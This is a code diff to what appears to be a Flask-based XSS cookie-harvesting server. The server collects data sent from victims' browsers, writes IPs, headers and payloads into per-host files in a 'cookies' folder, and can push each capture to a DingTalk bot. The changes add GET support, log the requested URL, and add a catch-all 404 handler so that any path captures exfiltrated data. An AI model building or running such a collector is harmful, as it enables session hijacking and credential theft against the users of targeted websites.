@@ -19,7 +19,7 @@ from config import crt, key, generate_js
 from dingtalk_bot import bot
 
 
-async def custom_js(data, ip: str, header: str, host):
+async def custom_js(data, ip: str, header: str, host, url=''):
     global ding
     global clear
 
@@ -32,21 +32,20 @@ async def custom_js(data, ip: str, header: str, host):
     else:
         delport = len(hostname)
     hostname = hostname[:delport]
-
     if ding:
-        bot(get_time + '\n' + 'HOST：' + host + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
+        bot(get_time + '\n' + 'HOST：' + host + '\n' + (url if url == '' else f"请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
 
     header = header.replace("\n", "")
 
     if os.path.isdir(f"{os.getcwd()}/cookies"):
         with open(f"cookies/{hostname}.txt", "a", encoding="utf-8") as f:
             f.write(
-                get_time + '\n' + 'HOST：' + host + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
+                get_time + '\n' + 'HOST：' + host + '\n' + (url if url == '' else f"请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
     else:
         os.mkdir(f"{os.getcwd()}/cookies")
         with open(f"cookies/{hostname}.txt", "a", encoding="utf-8") as f:
             f.write(
-                get_time + '\n' + 'HOST：' + host + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
+                get_time + '\n' + 'HOST：' + host + '\n' + (url if url == '' else f"请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
 
     if clear:
         if not ding:
@@ -123,7 +122,7 @@ app = Flask(__name__)
 CORS(app, resources=r'/*')
 
 
-@app.route('/request', methods=['POST'])
+@app.route('/request', methods=['POST', 'GET'])
 async def get_cookie():
     request_ip = request.remote_addr
     if js:
@@ -132,6 +131,15 @@ async def get_cookie():
         return "success"
     data = json.loads(request.get_data().decode())
     await save_data(data, request_ip, str(request.headers))
+    return "success"
+
+
+@app.errorhandler(404)
+async def page_not_found(e):
+    request_url = request.url
+    request_ip = request.remote_addr
+    host = dict(request.headers)['Origin']
+    await custom_js(request.get_data().decode(), request_ip, str(request.headers), host, request_url)
     return "success"
 
 
@@ -148,7 +156,7 @@ if __name__ == "__main__":
     arg.add_argument('-d', '--ding', action="store_true", help="启用钉钉机器人，可选项")
     arg.add_argument('-js', action="store_true", help="配置自定义JS，可选项")
     arg.add_argument('--screen', action="store_true", help="启用页面截图，可选项")
-    arg.add_argument('--clear', action="store_true",help="启用接受到数据后立即关闭服务端，可选项")
+    arg.add_argument('--clear', action="store_true", help="启用接受到数据后立即关闭服务端，可选项")
     arg = arg.parse_args()
 
     ding = arg.ding
